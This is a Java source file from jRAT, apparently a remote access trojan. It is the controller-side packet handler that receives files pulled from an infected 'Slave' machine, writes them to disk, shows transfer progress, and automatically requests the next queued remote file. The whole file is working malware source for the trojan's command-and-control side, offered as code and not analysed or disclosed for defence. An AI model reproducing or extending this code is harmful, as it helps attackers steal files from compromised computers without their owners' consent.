package io.jrat.client.packets.incoming;

import io.jrat.client.FileData;
import io.jrat.client.Slave;
import io.jrat.client.Traffic;
import io.jrat.client.packets.outgoing.Packet21GetFile;
import io.jrat.client.ui.frames.FrameFileTransfer;
import io.jrat.client.ui.frames.FrameRemoteFiles;
import io.jrat.common.io.FileIO;
import io.jrat.common.io.TransferListener;

import java.io.DataInputStream;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

import javax.swing.JOptionPane;


public class Packet29ReceiveFile extends AbstractIncomingPacket {

	public static final Map<Slave, FileData> data = new HashMap<Slave, FileData>();

	@Override
	public void read(final Slave slave, DataInputStream dis) throws Exception {
		String rfile = slave.readLine();
		final String remoteFile = slave.readLine();

		final FrameFileTransfer frame = FrameFileTransfer.instance;
		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);

		if (frame2 != null) {
			frame2.start();
		}

		final FileData localData = data.get(slave);

		File output = localData.getLocalFile();

		if (output.isDirectory()) {
			output = new File(output, rfile);
		}

		FileIO fileio = new FileIO();
		fileio.readFile(output, slave.getSocket(), slave.getDataInputStream(), slave.getDataOutputStream(), new TransferListener() {
			@Override
			public void transferred(long sent, long bytesSent, long totalBytes) {
				Traffic.increaseReceived(slave, (int) sent);

				int progress = (int) ((float) bytesSent / (float) totalBytes * 100.0F);

				if (frame != null) {
					frame.reportProgress(remoteFile, progress, (int) bytesSent, (int) totalBytes);
				}
				if (frame2 != null) {
					frame2.reportProgress(remoteFile, progress, (int) bytesSent, (int) totalBytes);
				}
			}
		}, slave.getKey());

		if (frame != null) {
			frame.done(remoteFile, output.length() + "");
		}

		if (frame2 != null) {
			frame2.done();
		}

		new Thread("Transfer notify") {
			@Override
			public void run() {
				if (localData.getRemoteFiles().size() > 0) {
					try {
						Thread.sleep(100L);
					} catch (Exception e) {
						e.printStackTrace();
					}
					String f = localData.getRemoteFiles().get(0);
					localData.getRemoteFiles().remove(0);
					slave.addToSendQueue(new Packet21GetFile(f));
				} else {
					data.remove(localData);
					JOptionPane.showMessageDialog(null, "All file transfers were done successfully.", "Success", JOptionPane.INFORMATION_MESSAGE);

					if (frame != null) {
						frame.reset();
					}
				}
			}
		}.start();
	}

}